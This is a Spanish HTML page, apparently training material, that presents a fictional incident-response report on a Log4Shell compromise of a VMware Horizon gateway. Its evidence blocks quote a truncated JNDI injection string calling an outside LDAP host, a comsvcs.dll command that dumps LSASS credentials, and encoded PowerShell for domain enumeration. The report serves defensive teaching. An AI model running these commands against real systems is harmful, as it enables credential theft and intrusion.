@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="es" class="scroll-smooth">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Informe técnico de respuesta a incidentes — EkoFinance</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Boldonse&family=Lato:wght@300;400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<link href="../../assets/base4-labs.css" rel="stylesheet">
+<script>
+tailwind.config = { theme: { extend: {
+  colors: { base: { bg:'#282828', surfaceAlt:'#1e1e1e', orange:'#DC780F', orangeAlt:'#F1912D' } },
+  fontFamily: { sans:['Lato','sans-serif'], display:['Boldonse','sans-serif'], mono:['JetBrains Mono','ui-monospace','monospace'] }
+} } }
+</script>
+</head>
+<body class="antialiased min-h-screen flex flex-col bg-base-bg text-gray-200">
+
+<nav class="top-nav sticky top-0 z-50 bg-base-bg/95 backdrop-blur border-b border-white/10 no-print">
+  <div class="max-w-5xl mx-auto px-6 py-3 flex items-center justify-between gap-4 flex-wrap">
+    <a href="../../labs/lab-04-lectura-de-insumos.html" class="text-xs font-bold tracking-[0.2em] uppercase text-gray-400 hover:text-base-orangeAlt transition-colors">
+      <i class="fas fa-arrow-left mr-2"></i>LAB 04 · Lectura de insumos
+    </a>
+    <div class="flex gap-2 flex-wrap items-center">
+      <a class="nav-pill" href="01-informe-tecnico-dfir.html"><span class="num">01</span> DFIR</a>
+      <a class="nav-pill" href="02-reporte-inteligencia-cti.html"><span class="num">02</span> CTI</a>
+      <a class="nav-pill" href="03-diagrama-red-anotado.html"><span class="num">03</span> Red</a>
+      <a class="nav-pill" href="04-estado-del-deception.html"><span class="num">04</span> Deception</a>
+      <button class="wb-btn" type="button" onclick="window.print()"><i class="fas fa-print"></i>PDF</button>
+    </div>
+  </div>
+</nav>
+
+<header class="border-b border-white/10 py-12">
+  <div class="max-w-5xl mx-auto px-6">
+    <div class="doc-banner mb-8">
+      <i class="fas fa-lock"></i><span>Uso interno · Confidencial · Cadena de custodia</span>
+      <span style="margin-left:auto;letter-spacing:0.08em">Documento de ejercitación · escenario ficticio</span>
+    </div>
+    <p class="text-base-orange font-bold tracking-[0.3em] uppercase mb-3 text-xs">EkoFinance · Insumo 01 · DFIR</p>
+    <h1 class="text-3xl md:text-4xl font-black tracking-tighter text-white mb-6">Informe técnico de respuesta a incidentes</h1>
+    <div class="unified-card is-static p-5">
+      <table class="doc-meta">
+        <tr><td>Caso</td><td>IR-2026-0088 · «Log4Shell en gateway VDI»</td></tr>
+        <tr><td>Equipo</td><td>Respuesta a Incidentes · EkoFinance (interno)</td></tr>
+        <tr><td>Analistas</td><td>Analista 1 (líder) · Analista 2 · Analista 3</td></tr>
+        <tr><td>Detección</td><td>19/06/2026 08:47 — alerta de tráfico saliente anómalo en EKO-BAL01</td></tr>
+        <tr><td>Emisión del informe</td><td>03/07/2026 (v1.2)</td></tr>
+        <tr><td>Alcance de la pericia</td><td>EKO-VDI01 y estaciones EKO-WS041 / 067 / 112. <strong style="color:#fca5a5">No incluyó servidores de VLAN PROD.</strong></td></tr>
+      </table>
+    </div>
+  </div>
+</header>
+
+<main class="flex-grow max-w-5xl mx-auto px-6 py-12 w-full doc-body">
+
+  <section>
+    <h2>Resumen ejecutivo</h2>
+    <p>
+      El 19 de junio de 2026 el SOC recibió una alerta por volumen saliente inusual desde la DMZ. La investigación determinó que el
+      gateway de VMware Horizon (<code class="inline">EKO-VDI01</code>) había sido comprometido el <span class="ref">08/06/2026</span>
+      mediante explotación del componente Log4j, 11 días antes de la detección. El adversario estableció persistencia, volcó
+      credenciales de memoria y estableció un canal de comando y control hacia <code class="inline">cdn-sync-eu[.]net</code>.
+    </p>
+    <p>
+      Se contuvo el host afectado, se preservaron imágenes de disco y memoria, y se rotaron las credenciales presentes en el equipo.
+      <strong class="text-white">El equipo de inteligencia (Insumo 02) sostiene que el compromiso alcanzó el controlador de dominio;
+      esta pericia no lo confirmó ni lo descartó</strong>, dado que el alcance autorizado se limitó a la DMZ y a tres estaciones.
+    </p>
+    <div class="callout is-pista">
+      <div class="callout-title"><i class="fas fa-clock"></i>Dato para la cronología</div>
+      <p class="text-sm leading-relaxed text-gray-300" style="margin:0">
+        Entre el compromiso (08/06) y la detección (19/06) transcurrieron <strong class="text-white">11 días</strong>. El informe no
+        explica esa ventana. Al reconstruir la línea de tiempo del LAB 04, ese hueco es más informativo que cualquiera de los eventos
+        registrados: es el período en que el adversario operó sin ser visto.
+      </p>
+    </div>
+  </section>
+
+  <section>
+    <h2>Metodología y evidencia</h2>
+    <p>Herramientas: FTK Imager (adquisición), Volatility 3 (memoria), Wireshark (red), Autorunsc de Sysinternals (persistencia). Toda la evidencia se preservó con hash SHA-256 y acta de custodia.</p>
+    <div class="unified-card is-static p-6">
+      <div class="table-scroll">
+      <table class="data-table">
+        <thead><tr><th>Ev.</th><th>Descripción</th><th>Origen</th><th>SHA-256 (parcial)</th></tr></thead>
+        <tbody>
+          <tr><td class="col-accent">E-01</td><td class="col-label">Imagen de disco</td><td>EKO-VDI01</td><td><code class="inline">a1b2c3…9f4e</code></td></tr>
+          <tr><td class="col-accent">E-02</td><td class="col-label">Volcado de memoria</td><td>EKO-VDI01</td><td><code class="inline">7d8e0a…2c11</code></td></tr>
+          <tr><td class="col-accent">E-03</td><td class="col-label">PCAP del span de DMZ</td><td>EKO-BAL01</td><td><code class="inline">4f5a6b…88de</code></td></tr>
+          <tr><td class="col-accent">E-04</td><td class="col-label">Exportación de logs de Horizon</td><td>EKO-VDI01</td><td><code class="inline">bb19c2…0a7f</code></td></tr>
+          <tr><td class="col-accent">E-05</td><td class="col-label">Triage de EKO-WS041 / 067 / 112</td><td>VLAN Oficina</td><td><code class="inline">c0ffee…4321</code></td></tr>
+        </tbody>
+      </table>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <h2>Acceso inicial y ejecución</h2>
+
+    <h3 class="numbered">Explotación de Log4j</h3>
+    <p>
+      El PCAP (E-03) contiene, el <span class="ref">08/06/2026 03:14:22</span>, una petición HTTP al servicio de Horizon con una cadena
+      JNDI en la cabecera <code class="inline">User-Agent</code>:
+    </p>
+    <div class="code-wrap relative">
+      <div class="code-caption"><i class="fas fa-code"></i>E-03 · paquete 88213</div>
+      <pre class="code">User-Agent: <span class="s">${jndi:ldap://45.9.148.arpa:1389/Basic/Command/Base64/&lt;...&gt;}</span></pre>
+    </div>
+    <p>El payload decodificado descarga y ejecuta una segunda etapa. La versión de Horizon era vulnerable a CVE-2021-44228.</p>
+    <ul>
+      <li><span class="ref">T1190</span> Explotación de aplicación pública</li>
+    </ul>
+
+    <h3 class="numbered">Persistencia por servicio y evasión</h3>
+    <p>
+      Autorunsc (E-01) revela un servicio creado el <span class="ref">08/06 03:35</span>, en arranque automático, que carga una DLL
+      desde una ruta no estándar:
+    </p>
+    <div class="code-wrap relative">
+      <div class="code-caption"><i class="fas fa-code"></i>E-01 · resultado_autoruns.txt</div>
+      <pre class="code"><span class="c"># Servicio en autoarranque</span>
+HKLM\SYSTEM\CurrentControlSet\Services\<span class="k">VMToolsHelper</span>
+  ImagePath = C:\Windows\Temp\vmw\<span class="s">OLEVIEW.EXE</span>
+  <span class="c"># OLEVIEW legítimo, pero acompañado de una DLL lateral:</span>
+  C:\Windows\Temp\vmw\<span class="s">IVIEWERS.dll</span>   (78,4 MB — inusual)</pre>
+    </div>
+    <p>
+      El binario <code class="inline">OLEVIEW.EXE</code> está firmado por Microsoft y carga por búsqueda de ruta la DLL
+      <code class="inline">IVIEWERS.dll</code>, maliciosa. La DLL fue <strong class="text-white">inflada a 78,4 MB</strong> con datos de
+      relleno, técnica frecuente para exceder el límite de tamaño de los análisis automáticos.
+    </p>
+    <ul>
+      <li><span class="ref">T1543.003</span> Servicio de Windows &middot; <span class="ref">T1574.002</span> Side-loading de DLL &middot; <span class="ref">T1027.001</span> Relleno de binario</li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>Comando y control</h2>
+    <p>El PCAP (E-03) muestra, desde el <span class="ref">08/06 04:02</span>, balizas HTTPS regulares hacia un mismo destino:</p>
+    <div class="code-wrap relative">
+      <div class="code-caption"><i class="fas fa-network-wired"></i>E-03 · sesiones salientes agrupadas</div>
+      <pre class="code">dst=<span class="s">cdn-sync-eu[.]net</span>  (resuelve a <span class="k">185.220.101.47</span>)
+  intervalo ≈ 300 s ± jitter · TLS · SNI mimetizado como CDN
+  primera baliza:  <span class="k">2026-06-08 04:02:17</span>
+  volumen 08–19/06: bajo y constante (beaconing)
+  <span class="c"># el 19/06 el volumen se dispara: exfiltración → dispara la alerta del SOC</span></pre>
+    </div>
+    <ul>
+      <li><span class="ref">T1071.001</span> Protocolo de capa de aplicación: web &middot; <span class="ref">T1573</span> Canal cifrado</li>
+    </ul>
+    <div class="callout is-atencion">
+      <div class="callout-title"><i class="fas fa-triangle-exclamation"></i>Nota del analista — a resolver con el equipo de CTI</div>
+      <p class="text-sm leading-relaxed text-gray-300" style="margin:0">
+        El dominio <code class="inline">cdn-sync-eu[.]net</code> aparece en nuestro PCAP con balizas desde el <span class="ref">08/06</span>.
+        El informe de inteligencia (Insumo 02, §2) data el registro del dominio el <span class="ref">21/06/2026</span>.
+        <strong class="text-white">Las dos afirmaciones no pueden ser ciertas a la vez.</strong> Queda abierta hasta reconciliar las fuentes.
+      </p>
+    </div>
+  </section>
+
+  <section>
+    <h2>Acceso a credenciales</h2>
+    <p>
+      El análisis de memoria (E-02) con Volatility muestra que el proceso malicioso accedió a <code class="inline">lsass.exe</code>
+      mediante <code class="inline">comsvcs.dll</code>, técnica de volcado de memoria del proceso de autenticación:
+    </p>
+    <div class="code-wrap relative">
+      <div class="code-caption"><i class="fas fa-memory"></i>E-02 · volatility · cmdline</div>
+      <pre class="code">rundll32.exe C:\Windows\System32\<span class="s">comsvcs.dll</span>, MiniDump
+  &lt;pid lsass&gt; C:\Windows\Temp\vmw\<span class="s">d.bin</span> full</pre>
+    </div>
+    <p>
+      El volcado <code class="inline">d.bin</code> recuperado de disco contenía material de autenticación de las sesiones activas en
+      EKO-VDI01. <strong class="text-white">Entre ellas, la cuenta <code class="inline">svc_vmwadmin</code></strong>, que la integración
+      de Horizon mantiene en memoria de forma permanente y que pertenece a Domain Admins (ver Insumo 03, §3.1).
+    </p>
+    <ul>
+      <li><span class="ref">T1003.001</span> Volcado de LSASS</li>
+    </ul>
+    <div class="callout is-pista">
+      <div class="callout-title"><i class="fas fa-lightbulb"></i>Consecuencia que este informe no persigue</div>
+      <p class="text-sm leading-relaxed text-gray-300" style="margin:0">
+        Recuperar la credencial de <code class="inline">svc_vmwadmin</code> le da al adversario una cuenta de Domain Admin válida.
+        Con ella, el movimiento al controlador de dominio no requiere ninguna vulnerabilidad adicional: es un inicio de sesión legítimo.
+        Este informe no siguió esa línea porque el DC quedó fuera del alcance autorizado.
+      </p>
+    </div>
+  </section>
+
+  <section>
+    <h2>Reconocimiento en las estaciones</h2>
+    <p>
+      El triage de EKO-WS041 / 067 / 112 (E-05) encontró ejecución de PowerShell codificado lanzado desde EKO-VDI01 el
+      <span class="ref">08/06 03:55</span>, orientado a enumerar el dominio:
+    </p>
+    <div class="code-wrap relative">
+      <div class="code-caption"><i class="fas fa-terminal"></i>E-05 · Event ID 4104 (script block)</div>
+      <pre class="code">powershell -enc <span class="s">&lt;base64&gt;</span>
+  <span class="c"># decodificado:</span>
+  Get-ADComputer -Filter * ; Get-ADUser -Filter * -Properties memberOf
+  nltest /dclist:ekofinance.local</pre>
+    </div>
+    <ul>
+      <li><span class="ref">T1059.001</span> PowerShell &middot; <span class="ref">T1082</span> / <span class="ref">T1018</span> Descubrimiento de sistema y de dominio</li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>Cronología</h2>
+    <div class="unified-card is-static p-6">
+      <div class="table-scroll">
+      <table class="data-table">
+        <thead><tr><th>Fecha/Hora</th><th>Evento</th><th>Host</th><th>Evidencia</th></tr></thead>
+        <tbody>
+          <tr><td class="col-accent">08/06 03:14</td><td class="col-label">Explotación de Log4j</td><td>EKO-VDI01</td><td>E-03</td></tr>
+          <tr><td class="col-accent">08/06 03:35</td><td class="col-label">Servicio de persistencia + side-loading</td><td>EKO-VDI01</td><td>E-01</td></tr>
+          <tr><td class="col-accent">08/06 03:55</td><td class="col-label">Reconocimiento con PowerShell</td><td>EKO-WS0xx</td><td>E-05</td></tr>
+          <tr><td class="col-accent">08/06 04:02</td><td class="col-label">Primera baliza de C2</td><td>EKO-VDI01</td><td>E-03</td></tr>
+          <tr><td class="col-accent">08/06 05:24</td><td class="col-label">Volcado de LSASS (comsvcs)</td><td>EKO-VDI01</td><td>E-02</td></tr>
+          <tr><td class="col-accent">08–19/06</td><td class="col-label">Beaconing de bajo volumen · <strong class="text-white">sin actividad registrada en el alcance de la pericia</strong></td><td>—</td><td>E-03</td></tr>
+          <tr><td class="col-accent">19/06 08:47</td><td class="col-label">Pico de volumen saliente &rarr; alerta del SOC</td><td>EKO-BAL01</td><td>E-03</td></tr>
+          <tr><td class="col-accent">19/06 10:10</td><td class="col-label">Contención de EKO-VDI01</td><td>EKO-VDI01</td><td>—</td></tr>
+        </tbody>
+      </table>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <h2>Conclusiones</h2>
+    <ul class="space-y-2">
+      <li class="flex gap-2"><i class="fas fa-circle text-[5px] text-base-orange mt-2"></i><span>El vector de entrada fue Log4j sobre un Horizon desactualizado, expuesto a internet.</span></li>
+      <li class="flex gap-2"><i class="fas fa-circle text-[5px] text-base-orange mt-2"></i><span>El adversario logró persistencia, evasión por side-loading y volcado de credenciales de Domain Admin desde la memoria del gateway.</span></li>
+      <li class="flex gap-2"><i class="fas fa-circle text-[5px] text-base-orange mt-2"></i><span>Se estableció un canal de C2 encubierto que operó 11 días antes de la detección.</span></li>
+      <li class="flex gap-2"><i class="fas fa-circle text-[5px] text-base-orange mt-2"></i><span><strong class="text-white">No se hallaron indicios de compromiso del controlador de dominio</strong> en el material periciado.</span></li>
+    </ul>
+    <div class="callout is-atencion">
+      <div class="callout-title"><i class="fas fa-circle-exclamation"></i>Sobre la última conclusión</div>
+      <p class="text-sm leading-relaxed text-gray-300" style="margin:0">
+        «No se hallaron indicios» no equivale a «no ocurrió». El alcance autorizado de esta pericia
+        <strong class="text-white">excluyó los servidores de VLAN PROD, incluido EKO-DC01</strong>. La ausencia de evidencia aquí
+        refleja dónde miramos, no lo que pasó. El Insumo 02 aporta observaciones que contradicen la lectura tranquilizadora de esta línea.
+      </p>
+    </div>
+  </section>
+
+  <section>
+    <h2>Recomendaciones inmediatas</h2>
+    <ul class="space-y-2">
+      <li class="flex gap-2"><i class="fas fa-check text-base-orange mt-1 text-xs"></i><span>Actualizar Horizon y remediar Log4j en todo activo expuesto.</span></li>
+      <li class="flex gap-2"><i class="fas fa-check text-base-orange mt-1 text-xs"></i><span>Rotar <code class="inline">svc_vmwadmin</code> y quitarla de Domain Admins; evaluar gMSA.</span></li>
+      <li class="flex gap-2"><i class="fas fa-check text-base-orange mt-1 text-xs"></i><span>Bloquear y sinkhole de <code class="inline">cdn-sync-eu[.]net</code> en el DNS interno.</span></li>
+      <li class="flex gap-2"><i class="fas fa-check text-base-orange mt-1 text-xs"></i><span><strong class="text-white">Ampliar la pericia a VLAN PROD y al DC</strong> para cerrar la pregunta abierta.</span></li>
+    </ul>
+  </section>
+
+</main>
+
+<footer class="border-t border-white/10 mt-12 py-8 no-print">
+  <div class="max-w-5xl mx-auto px-6 flex flex-col md:flex-row items-center justify-between gap-4">
+    <a href="../../labs/lab-04-lectura-de-insumos.html" class="back-link"><i class="fas fa-arrow-left"></i>Volver al LAB 04</a>
+    <p class="text-xs text-gray-500">Escenario de ejercitación · Active Cyber Defense · Ekoparty 2026</p>
+  </div>
+</footer>
+
+</body>
+</html>
